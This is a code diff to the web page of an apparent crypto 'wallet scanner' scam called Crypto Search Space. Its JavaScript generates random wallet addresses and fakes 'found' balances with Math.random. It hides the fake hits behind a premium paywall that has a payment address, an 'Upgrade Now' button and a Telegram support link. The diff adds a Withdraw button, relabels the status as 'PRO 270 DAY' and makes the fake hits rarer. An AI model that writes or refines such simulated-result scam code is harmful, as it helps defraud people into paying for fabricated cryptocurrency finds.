@@ -335,12 +335,13 @@ body {
 
 
   <div class="sidebar">
-    <h1>Crypto Search Space ™</h1>
-    <button id="scannerBtn">🔍 Scanner</button>
-    <button id="homeBtn">🏠 Home</button>
-    <a href="https://t.me/cryptos_search_admin" target="_blank">📩 Support</a>
-    <a class="upgrade-btn" id="upgradeNowBtn" href="javascript:void(0)">🔓 Upgrade Now</a>
-  </div>
+  <h1>Crypto Search Space ™</h1>
+  <button id="scannerBtn">🔍 Scanner</button>
+  <button id="withdrawBtn">💸 Withdraw</button> <!-- Home এর জায়গায় Withdraw -->
+  <a href="https://t.me/cryptos_search_admin" target="_blank">📩 Support</a>
+  <a class="upgrade-btn" id="upgradeNowBtn" href="javascript:void(0)">🔓 Upgrade Now</a>
+</div>
+
   <div class="main">
     <div class="header">
       <div class="blockchains">
@@ -358,7 +359,7 @@ body {
   </label>
 </div>
 
-      <div style="color:orange; font-weight: bold;">Status: TRIAL VERSION</div>
+      <div style="color:orange; font-weight: bold;">Status: PRO 270 DAY</div>
 
       <div class="notice-slider" id="noticeSlider">
   <marquee behavior="scroll" direction="left" scrollamount="5">
@@ -523,7 +524,7 @@ body {
       checkedCount.textContent = checked;
       const chain = chains[Math.floor(Math.random() * chains.length)];
       const wallet = generateWalletAddress(chain);
-      const hasBalance = checked >= 3000 && Math.random() < 0.03;
+      const hasBalance = checked >= 6000 && Math.random() < 0.03;
       const balance = hasBalance ? getRandomBalance() : "0.00";
       const displayWallet = hasBalance ? "[Hidden - Premium]" : wallet;
       const line = document.createElement('div');
@@ -627,7 +628,7 @@ line.innerHTML = `
   startBtn.addEventListener("click", startSearch);
   stopBtn.addEventListener("click", stopSearch);
   scannerBtn.addEventListener("click", startSearch);
-  homeBtn.addEventListener("click", goHome);
+ 
 
   window.onload = function() {
     loadData();
@@ -646,7 +647,7 @@ line.innerHTML = `
   const startBtn = document.getElementById("startBtn");
   const stopBtn = document.getElementById("stopBtn");
   const scannerBtn = document.getElementById("scannerBtn");
-  const homeBtn = document.getElementById("homeBtn");
+ 
 
   const plans = [ /* unchanged plan list */ ];
   const paymentAddress = "0x56169808ee926359c3403c2049d77c574b40db32";
@@ -804,7 +805,7 @@ line.innerHTML = `
   startBtn.addEventListener("click", startSearch);
   stopBtn.addEventListener("click", stopSearch);
   scannerBtn.addEventListener("click", startSearch);
-  homeBtn.addEventListener("click", goHome);
+ 
 
   // On first load
   window.onload = loadData;
